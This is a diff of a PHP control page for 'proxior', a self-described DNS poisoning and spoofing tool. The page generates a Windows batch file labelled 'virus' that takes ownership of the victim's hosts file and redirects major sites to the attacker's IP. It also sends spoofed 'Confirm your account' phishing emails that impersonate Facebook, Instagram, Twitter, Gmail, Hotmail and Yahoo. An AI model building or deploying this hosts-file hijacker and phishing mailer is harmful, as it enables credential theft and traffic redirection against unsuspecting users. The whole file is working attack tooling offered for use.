@@ -1,7 +1,36 @@
+<?php
+
+/*
+*  Copyright (c) 2019 Barchampas Gerasimos <makindosx@gmail.com>.
+*  proxior is a program for poisoning and spoofing dns.
+*
+*  proxior is free software: you can redistribute it and/or modify
+*  it under the terms of the GNU Affero General Public License as published by
+*  the Free Software Foundation, either version 3 of the License, or
+*  (at your option) any later version.
+*
+*  proxior is distributed in the hope that it will be useful,
+*  but WITHOUT ANY WARRANTY; without even the implied warranty of
+*  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
+*  GNU Affero General Public License for more details.
+*
+*  You should have received a copy of the GNU Affero General Public License
+*  along with this program.  If not, see <http://www.gnu.org/licenses/>.
+*
+*/
+
+
+ session_start();
+
+ clearstatcache();
+
+?>
+
+
 <html>
 <head>
 
-    <title> clonenew </title>
+    <title> proxior </title>
   
   <link rel="icon" type="image/jpg" href="/css/clone_title.jpg" />
 
@@ -10,12 +39,10 @@
 
 
 <style>
-
 input[type='radio'] 
 { 
 transform: scale(2); 
 }
-
 </style>
 
 
@@ -33,27 +60,27 @@ transform: scale(2);
 
       <div align="center">
 
-     <h3> 1) Create virus </h3> 
+     <h3> <font color="white"> 1) Create virus </font> </h3> 
 
     <form action="" method="post">
 
    <select name="fake_dns" id="select_dns" required>
-     <option selected disabled> Operating System of victim </option>
+     <option selected disabled > Operating System of victim </option>
       <optgroup label="Microsoft windows">
-    <option value ="windows xp">   Windows XP  </option>
-    <option value ="windows 7">    Windows 7  </option>
-    <option value ="windows 8">    Windows 8  </option>
-    <option value ="windows 8.1">  Windows 8.1  </option>
-    <option value ="windows 10">   Windows 10  </option>
+    <option value ="windows xp"> &#9705; &#120143; &#8473; &nbsp;  Windows XP  </option>
+    <option value ="windows 7"> &#9705; &#55; &nbsp;   Windows 7  </option>
+    <option value ="windows 8"> &#9705; &#56; &nbsp;  Windows 8  </option>
+    <option value ="windows 8.1"> &#9705; &#56;.&#49; &nbsp; Windows 8.1  </option>
+    <option value ="windows 10"> &#9705; &#49;&#48; &nbsp;  Windows 10  </option>
       </optgroup>
   </select>
     
        <br><br>
 
 
-      <input type="radio" name="network" value="Lan" checked required> Lan
+      <input type="radio" name="network" value="Lan" checked required> <font color="white"> Lan </font>
          &nbsp; &nbsp; &nbsp; 
-      <input type="radio" name="network" value="Wan"> Wan
+      <input type="radio" name="network" value="Wan"> <font color="white"> Wan </font>
 
 
      <br><br>
@@ -69,7 +96,7 @@ transform: scale(2);
  
      <div align="center">
 
-            <h3> 2) Send to email </h3> 
+            <h3> <font color="white"> 2) Send to email </font> </h3> 
 
          <form action="" method="post">
 
@@ -80,13 +107,13 @@ transform: scale(2);
          --> 
 
 
-  <font color="black">  < </font>
+  <font color="white">  < </font>
      <input type="email" name="email" id="email" maxlength="64" placeholder="Email to victim"  required> 
-      <font color="black"> > </font>
+      <font color="white"> > </font>
  
-      <font color="black">  < </font>
-     <input type="text" name="ngrok" id="ngrok" maxlength="64" placeholder="Ngrok link"  required> 
-      <font color="black"> > </font>
+      <font color="white">  < </font>
+     <input type="text" name="ngrok" id="ngrok" maxlength="64" placeholder="Ngrok link or Another"  required> 
+      <font color="white"> > </font>
 
              <br><br> 
 
@@ -99,14 +126,14 @@ transform: scale(2);
          <br>
 
       <div align="center">
-        <h3> 3) Normal attack </h3> 
+        <h3> <font color="white"> 3) Dns Spoof </font> </h3> 
                <?php
               
                  $url_redirection = shell_exec('shell/./my_ipv4.sh');
             //echo "<meta http-equiv='refresh' content= '2;URL=http://$url_redirection?login'/>";
  
             echo "<form action='http://$url_redirection' method='post'>
-                   <input type='submit' name='normal' value='Normal attack' id='submit'>
+                   <input type='submit' name='dns_spoof' value='Dns Spoof' id='submit'>
                   </form>"; 
               ?>
       </div>
@@ -130,116 +157,70 @@ transform: scale(2);
 <?php
 
 
-
- clearstatcache();
-
-  session_start();
-
-
   require_once('__SRC__/class_tools.php');
 
   if (class_exists('INPUT_DATA_AVAILABLE')) 
       {
         $obj_dns = new INPUT_DATA_AVAILABLE;
       
-
    if (isset($_POST['submit_dns']))
        {
-
       $fake_dns   =  $obj_dns-> SAFE_DATA_ENTER($_POST['fake_dns']);
       $network    =  $obj_dns-> SAFE_DATA_ENTER($_POST['network']);
  
        if($fake_dns == true)
          {
  
-
          // Get path from operating system 
-
-
-
         if($fake_dns == "windows xp")
            {
             $operating_system_path =  "C:\WINDOWS\System32\drivers";
              }
-
-
         else if($fake_dns == "windows 7")
              {
               $operating_system_path =  "C:\Windows\System32\drivers";
               }
-
-
        else if($fake_dns == "windows 8")
              {
               $operating_system_path =  "C:\Windows\System32\Drivers";
               }
-
-
         else if($fake_dns == "windows 8.1")
              {
               $operating_system_path =  "C:\Windows\System32\Drivers";
               }
-
   
-
         else if($fake_dns == "windows 10")
              {
               $operating_system_path =  "C:\Windows\System32\drivers";
               }
  
-
-
-
               if (isset($_SESSION['site_hack']))             
                 {
-
             $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));
-
             $PublicIP = trim(shell_exec("shell/./my_public_ip.sh")); 
-
-
-
-
               // Get network type for attack
-
               if ($network == "Lan")
                {
                 $MyIP = $ipv4;
                  }
-
-
              else  if ($network == "Wan")
                  {
                   $MyIP = $PublicIP;
                    }
-
-
-
-
             $dns = '"' .$_SESSION['site_hack'] .'"';
-
-
             $dns_0 = str_replace ("https","http",$dns);
-
             $dns_1 = str_replace ("https://","",$dns);
  
             $dns_2 = str_replace ("https://www.","",$dns);
  
             $dns_3 = str_replace ("com","gr",$dns_1);
-
             $dns_4 = str_replace ("com","gr",$dns_2);
-
-
             $dns_5 = str_replace ("https","http",$dns);
  
             $dns_6 = str_replace ("https://www.","http://",$dns);
  
             $dns_7 = str_replace ("com","gr",$dns_5);
-
             $dns_8 = str_replace ("com","gr",$dns_6);
-
-
-
             $hosts = fopen("export/l_win.bat", "w") or die("Unable to open file!");
             $lines_hosts = '@echo off' 
                     .PHP_EOL .'Takeown /f' ." "  ."$operating_system_path"  .'\etc\hosts'
@@ -259,71 +240,38 @@ transform: scale(2);
                     .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_7, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                     .PHP_EOL ."echo $MyIP"  ." "  .trim($dns_8, '"')  ." "  .'>>'  ." "  ."$operating_system_path"  .'\etc\hosts'
                     .PHP_EOL .'exit'; 
-
-
-
             fwrite($hosts, $lines_hosts);
             fclose($hosts);
-
-           chmod("/var/www/clonenew/export/l_win.bat", 0777);
-
-
+           chmod("/var/www/proxior/export/l_win.bat", 0777);
               } // end of isset session site hack
-
-
-
-
-
-
           if (isset($_SESSION['site_ready']))
               {
-
-
             $ipv4 = trim(shell_exec('shell/./my_ipv4.sh'));
-
             $publicIP = trim(shell_exec("shell/./my_public_ip.sh")); 
-
-
-
-
               // Get network type for attack
-
               if ($network == "Lan")
                {
                 $MyIP = $ipv4;
                  }
-
-
              else  if ($network == "Wan")
                  {
                   $MyIP = $publicIP;
                    }
-
  
-
             $dns_ready = '"' .$_SESSION['site_ready'] .'"';
-
             $dns_ready_0 = str_replace ("https","http",$dns_ready);
-
             $dns_ready_1 = str_replace ("https://","",$dns_ready);
  
             $dns_ready_2 = str_replace ("https://www.","",$dns_ready);
  
             $dns_ready_3 = str_replace ("com","gr",$dns_ready_1);
-
             $dns_ready_4 = str_replace ("com","gr",$dns_ready_2);
-
-
             $dns_ready_5 = str_replace ("https","http",$dns_ready);
  
             $dns_ready_6 = str_replace ("https://www.","http://",$dns_ready);
  
             $dns_ready_7 = str_replace ("com","gr",$dns_ready_5);
-
             $dns_ready_8 = str_replace ("com","gr",$dns_ready_6);
-
-
-
          $hosts_ready = fopen("export/l_win.bat", "w") or die("Unable to open file!");
          $lines_hosts_ready = '@echo off' 
              .PHP_EOL .'Takeown /f' ." "  ."$operating_system_path"
@@ -345,66 +293,37 @@ transform: scale(2);
              .PHP_EOL .'exit';
          fwrite($hosts_ready, $lines_hosts_ready);
          fclose($hosts_ready);
-
-
-
-        chmod("/var/www/clonenew/export/l_win.bat", 0777);
+        chmod("/var/www/proxior/export/l_win.bat", 0777);
             
              } // end of isset session site_ready
-
-
-
-
   //echo "<script type='text/javascript'>alert('Fake dns for $fake_dns generated');
        //  </script>";
           echo ("<script>location.href='/'</script>");
          } 
  
-
        } // end of submit dns
-
-
-
-
-
-
-
-
  
      // for sumbit email phishing
-
      if (isset($_POST['submit_email_phishing']))
          {
  
        // $email_net =  $obj_dns-> SAFE_DATA_ENTER($_POST['email_net']);
         $email     =  $obj_dns-> SAFE_DATA_ENTER($_POST['email']);
         $ngrok     =  $obj_dns-> SAFE_DATA_ENTER($_POST['ngrok']);
-
-
         //$ipv4_mail = trim(shell_exec('shell/./my_ipv4.sh'));
-
        // $PublicIP_mail = trim(shell_exec("shell/./my_public_ip.sh")); 
-
-
-
-
               // Get network type for attack
-
               //if ($email_net == "Lan")
               // {
                // $MyIP_mail = $ipv4_mail;
                //  }
-
-
             // else  if ($email_net == "Wan")
                //  {
                //   $MyIP_mail = $PublicIP_mail;
                 //   }
-
-
-
                // Get clone site name from send link to email 
         
+
              if (isset($_SESSION['site_hack']))             
                 {
                   $str_link =  $_SESSION['site_hack'];
@@ -425,53 +344,29 @@ transform: scale(2);
                    }
 
 
-
-
  if ($link == 'no-reply@facebook_pc.com')
         {
-
           $link = str_replace(".com_pc","",$str_link2);
           $link =   "no-reply" ."@" .$link .".com";
-
-
-      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
-
-
-
+      require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
-
 $mail->CharSet = 'UTF-8';
-
 $mail->IsSMTP(); // enable SMTP
-
 $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-
 $mail->SMTPAuth = true; // authentication enabled
-
 $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-
 $mail->Host = "smtp.gmail.com";
-
 $mail->Port = 465; // or 587
-
 $mail->IsHTML(true);
-
 $mail->Username = "";
-
 $mail->Password = "";
-
 $mail->SetFrom($link, $link);
-
 $mail->FromName = $link;
-
-
 $mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
-
-$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Facebook";
-
+$mail->Subject = "Confirm your Facebook account";
 $mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
                 <font color='#45569C'>
-                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Facebook  
+                 Action Required: Confirm your Facebook account  
                  </font>  
               </h2> 
                <br><br>
@@ -479,82 +374,48 @@ $mail->Body = "<h2> <img src='cid:fb' height='24' width='24'>
                                                   text-align: center; border-radius: 3px; color: white;
                                                   font-weight: bold; background:#45569C; color:white; 
                                                   font-size: 14px; text-decoration: none'> 
-                Επιβεβαιώστε το λογαριασμό σας 
+                Confirm your account 
                 </a>";
              
-
 $mail->AddAddress("$email");
-
-
      if ($mail->Send()) 
         {
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
          }
-
-
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
        }
-
-
       } // end if site ready facebook pc
  
 
-
-
-
-
-
 else if ($link == 'no-reply@facebook_tablet_mobile.com')
         {
-
           $link = str_replace(".com_tablet_mobile","",$str_link2);
           $link =   "no-reply" ."@" .$link .".com";
-
-
-      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
-
-
-
+      require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
-
 $mail->CharSet = 'UTF-8';
-
 $mail->IsSMTP(); // enable SMTP
-
 $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-
 $mail->SMTPAuth = true; // authentication enabled
-
 $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-
 $mail->Host = "smtp.gmail.com";
-
 $mail->Port = 465; // or 587
-
 $mail->IsHTML(true);
-
 $mail->Username = "";
-
 $mail->Password = "";
-
 $mail->SetFrom($link, $link);
-
 $mail->FromName = $link;
-
-
 $mail->AddEmbeddedImage('css/mail_pics/fb.png', 'fb');
-
-$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Facebook";
-
+$mail->Subject = "Confirm your Facebook account";
 $mail->Body = "<h2> <img src='cid:fb' height='24' width='24'> 
                 <font color='#45569C'>
-                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Facebook  
+                 Action Required: Confirm your Facebook account  
                  </font>  
               </h2> 
                <br><br>
@@ -562,79 +423,47 @@ $mail->Body = "<h2> <img src='cid:fb' height='24' width='24'>
                                                   text-align: center; border-radius: 3px; color: white;
                                                   font-weight: bold; background:#45569C; color:white; 
                                                   font-size: 14px; text-decoration: none'> 
-                Επιβεβαιώστε το λογαριασμό σας 
+                Confirm your account 
                 </a>";
              
-
 $mail->AddAddress("$email");
-
-
      if ($mail->Send()) 
         {
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
          }
-
-
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
        }
-
-
       } // end if site ready facebook tablet and mobile
-
-
-
-
-
 
 
 
  else if ($link == 'no-reply@instagram.com')
         {
-
-      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
-
-
-
+      require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
-
 $mail->CharSet = 'UTF-8';
-
 $mail->IsSMTP(); // enable SMTP
-
 $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-
 $mail->SMTPAuth = true; // authentication enabled
-
 $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-
 $mail->Host = "smtp.gmail.com";
-
 $mail->Port = 465; // or 587
-
 $mail->IsHTML(true);
-
 $mail->Username = "";
-
 $mail->Password = "";
-
 $mail->SetFrom($link, $link);
-
 $mail->FromName = $link;
-
-
 $mail->AddEmbeddedImage('css/mail_pics/inst.png', 'inst');
-
-$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Instagram";
-
+$mail->Subject = "Confirm your Instagram account";
 $mail->Body = "<h2> <img src='cid:inst' height='24' width='24'> 
                 <font color='#EB9E6B'>
-                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Instagram  
+                 Action Required: Confirm your Instagram account  
                  </font>  
               </h2> 
                <br><br>
@@ -642,78 +471,47 @@ $mail->Body = "<h2> <img src='cid:inst' height='24' width='24'>
                                                   text-align: center; border-radius: 3px; color: white;
                                                   font-weight: bold; background:#EB9E6B; color:white; 
                                                   font-size: 14px; text-decoration: none'> 
-                Επιβεβαιώστε το λογαριασμό σας 
+                Confirm your account 
                 </a>";
              
-
 $mail->AddAddress("$email");
-
-
      if ($mail->Send()) 
         {
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
          }
-
-
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
        }
-
-
       } // end if site ready instagram
-
-
-
-
 
 
 
 else if ($link == 'no-reply@twitter.com')
         {
-
-      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
-
-
-
+      require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
-
 $mail->CharSet = 'UTF-8';
-
 $mail->IsSMTP(); // enable SMTP
-
 $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-
 $mail->SMTPAuth = true; // authentication enabled
-
 $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-
 $mail->Host = "smtp.gmail.com";
-
 $mail->Port = 465; // or 587
-
 $mail->IsHTML(true);
-
 $mail->Username = "";
-
 $mail->Password = "";
-
 $mail->SetFrom($link, $link);
-
 $mail->FromName = $link;
-
-
 $mail->AddEmbeddedImage('css/mail_pics/twitt.png', 'twitt');
-
-$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Twitter";
-
+$mail->Subject = "Confirm your Twitter account";
 $mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'> 
                 <font color='#65A8EC'>
-                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Twitter  
+                 Action Required: Confirm your Twitter account  
                  </font>  
               </h2> 
                <br><br>
@@ -721,78 +519,47 @@ $mail->Body = "<h2> <img src='cid:twitt' height='24' width='24'>
                                                   text-align: center; border-radius: 3px; color: white;
                                                   font-weight: bold; background:#65A8EC; color:white; 
                                                   font-size: 14px; text-decoration: none'> 
-                Επιβεβαιώστε το λογαριασμό σας 
+                Confirm your account 
                 </a>";
              
-
 $mail->AddAddress("$email");
-
-
      if ($mail->Send()) 
         {
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
          }
-
-
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
        }
-
-
       } // end if site ready twitter
-
-
-
-
 
 
 
 else if ($link == 'no-reply@gmail.com')
         {
-
-      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
-
-
-
+      require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
-
 $mail->CharSet = 'UTF-8';
-
 $mail->IsSMTP(); // enable SMTP
-
 $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-
 $mail->SMTPAuth = true; // authentication enabled
-
 $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-
 $mail->Host = "smtp.gmail.com";
-
 $mail->Port = 465; // or 587
-
 $mail->IsHTML(true);
-
 $mail->Username = "";
-
 $mail->Password = "";
-
 $mail->SetFrom($link, $link);
-
 $mail->FromName = $link;
-
-
 $mail->AddEmbeddedImage('css/mail_pics/gm.png', 'gm');
-
-$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Gmail";
-
+$mail->Subject = "Confirm your Gmail account";
 $mail->Body = "<h2> <img src='cid:gm' height='24' width='24'> 
                 <font color='#CA3737'>
-                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Gmail  
+                 Action Required: Confirm your Gmail account  
                  </font>  
               </h2> 
                <br><br>
@@ -800,86 +567,50 @@ $mail->Body = "<h2> <img src='cid:gm' height='24' width='24'>
                                                   text-align: center; border-radius: 3px; color: white;
                                                   font-weight: bold; background:#CA3737; color:white; 
                                                   font-size: 14px; text-decoration: none'> 
-                Επιβεβαιώστε το λογαριασμό σας 
+                Confirm your account 
                 </a>";
              
-
 $mail->AddAddress("$email");
-
-
      if ($mail->Send()) 
         {
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
          }
-
-
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
        }
-
-
       } // end if site ready gmail
-
-
-
-
-
-
-
 
 
 
 else if ($link == 'no-reply@https://login.live.com')
         {
-
           $str_link2 = str_replace("https://","",$str_link);
           $str_link3 = str_replace(".com","",$str_link2);
           $link =   "no-reply" ."@" .$str_link3 .".com";
-
-
-      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
-
-
-
+      require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
-
 $mail->CharSet = 'UTF-8';
-
 $mail->IsSMTP(); // enable SMTP
-
 $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-
 $mail->SMTPAuth = true; // authentication enabled
-
 $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-
 $mail->Host = "smtp.gmail.com";
-
 $mail->Port = 465; // or 587
-
 $mail->IsHTML(true);
-
 $mail->Username = "";
-
 $mail->Password = "";
-
 $mail->SetFrom($link, $link);
-
 $mail->FromName = $link;
-
-
 $mail->AddEmbeddedImage('css/mail_pics/hotm.png', 'hotm');
-
-$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Hotmail";
-
+$mail->Subject = "Confirm your Gmail account";
 $mail->Body = "<h2> <img src='cid:hotm' height='24' width='24'> 
                 <font color='#006BC1'>
-                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Hotmail  
+                 Action Required: Confirm your Gmail account  
                  </font>  
               </h2> 
                <br><br>
@@ -887,78 +618,47 @@ $mail->Body = "<h2> <img src='cid:hotm' height='24' width='24'>
                                                   text-align: center; border-radius: 3px; color: white;
                                                   font-weight: bold; background:#006BC1; color:white; 
                                                   font-size: 14px; text-decoration: none'> 
-                Επιβεβαιώστε το λογαριασμό σας 
+                Confirm your account 
                 </a>";
              
-
 $mail->AddAddress("$email");
-
-
      if ($mail->Send()) 
         {
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
          }
-
-
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
        }
-
-
       } // end if site ready hotmail
-
-
-
-
 
 
 
 else if ($link == 'no-reply@yahoo.com')
         {
-
-      require "/var/www/clonenew/mail/PHPMailerAutoload.php";
-
-
-
+      require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
-
 $mail->CharSet = 'UTF-8';
-
 $mail->IsSMTP(); // enable SMTP
-
 $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-
 $mail->SMTPAuth = true; // authentication enabled
-
 $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-
 $mail->Host = "smtp.gmail.com";
-
 $mail->Port = 465; // or 587
-
 $mail->IsHTML(true);
-
 $mail->Username = "";
-
 $mail->Password = "";
-
 $mail->SetFrom($link, $link);
-
 $mail->FromName = $link;
-
-
 $mail->AddEmbeddedImage('css/mail_pics/yah.png', 'yah');
-
-$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας στο Yahoo";
-
+$mail->Subject = "Confirm your Yahoo account";
 $mail->Body = "<h2> <img src='cid:yah' height='24' width='24'> 
                 <font color='#720E9E'>
-                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας στο Yahoo 
+                 Action Required: Confirm your Yahoo account 
                  </font>  
               </h2> 
                <br><br>
@@ -966,77 +666,47 @@ $mail->Body = "<h2> <img src='cid:yah' height='24' width='24'>
                                                   text-align: center; border-radius: 3px; color: white;
                                                   font-weight: bold; background:#720E9E; color:white; 
                                                   font-size: 14px; text-decoration: none'> 
-                Επιβεβαιώστε το λογαριασμό σας 
+                Confirm your account 
                 </a>";
              
-
 $mail->AddAddress("$email");
-
-
      if ($mail->Send()) 
         {
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
          }
-
-
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
        }
-
-
       } // end if site ready yahoo
-
-
-
 
 
 
 else 
   {
-
-   require "/var/www/clonenew/mail/PHPMailerAutoload.php";
-
-
-
+   require "/var/www/proxior/mail/PHPMailerAutoload.php";
 $mail = new PHPMailer(); // create a new object
-
 $mail->CharSet = 'UTF-8';
-
 $mail->IsSMTP(); // enable SMTP
-
 $mail->SMTPDebug = 0; // debugging: 1 = errors and messages, 2 = messages only
-
 $mail->SMTPAuth = true; // authentication enabled
-
 $mail->SMTPSecure = 'ssl'; // secure transfer enabled REQUIRED for Gmail
-
 $mail->Host = "smtp.gmail.com";
-
 $mail->Port = 465; // or 587
-
 $mail->IsHTML(true);
-
 $mail->Username = "";
-
 $mail->Password = "";
-
 $mail->SetFrom($link, $link);
-
 $mail->FromName = $link;
-
-
 $mail->AddEmbeddedImage('css/mail_pics/any.png', 'any');
-
-$mail->Subject = "Επιβεβαιώστε το λογαριασμό σας";
-
+$mail->Subject = "Confirm your account";
 $mail->Body = "<h2> <img src='cid:any' height='24' width='24'> 
                 <font color='black'>
-                 Απαιτούμενη ενέργεια: Επιβεβαιώστε το λογαριασμό σας 
+                 Action Required: Confirm your account 
                  </font>  
               </h2> 
                <br><br>
@@ -1044,40 +714,25 @@ $mail->Body = "<h2> <img src='cid:any' height='24' width='24'>
                                                   text-align: center; border-radius: 3px; color: white;
                                                   font-weight: bold; background:grey; color:white; 
                                                   font-size: 14px; text-decoration: none'> 
-                Επιβεβαιώστε το λογαριασμό σας 
+                Confirm your account 
                 </a>";
              
-
 $mail->AddAddress("$email");
-
-
      if ($mail->Send()) 
         {
       // echo '<script type="text/javascript">alert("Phishing attack Successfully");
         // </script>';
         echo ("<script>location.href='/'</script>");
          }
-
-
      else 
       {
       echo '<script type="text/javascript">alert("Phishing attack failed");
          </script>';
        echo ("<script>location.href='/'</script>");
        }
-
-
       } // end if site anything
-
-
-
-
     } // end isset of email phishing 
-
-
-
    } // end if isset of class
-
 
 
 ?>
